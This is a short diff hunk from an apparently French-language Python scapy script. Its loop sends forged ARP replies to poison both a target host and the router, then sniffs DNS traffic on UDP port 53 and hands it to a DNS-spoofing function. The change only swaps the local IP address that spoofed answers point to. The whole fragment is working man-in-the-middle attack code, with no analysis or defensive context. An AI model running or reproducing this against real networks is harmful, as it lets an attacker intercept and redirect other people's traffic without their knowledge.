@@ -88,7 +88,7 @@ def main():
     while True:
         scapy.send(scapy.ARP(op=2, pdst=cible[1], hwdst=cible[0], psrc=routeur[1], hwsrc=myMac), verbose=0)
         scapy.send(scapy.ARP(op=2, pdst=routeur[1], hwdst=routeur[0], psrc=cible[1], hwsrc=myMac), verbose=0)
-        scapy.sniff(prn=forwardDnsSpoofing("192.168.1.5"), filter='udp port 53', iface=interface, store=0, timeout=60, count=1)
+        scapy.sniff(prn=forwardDnsSpoofing("192.168.1.12"), filter='udp port 53', iface=interface, store=0, timeout=60, count=1)
 
 if __name__ == '__main__':
     main()
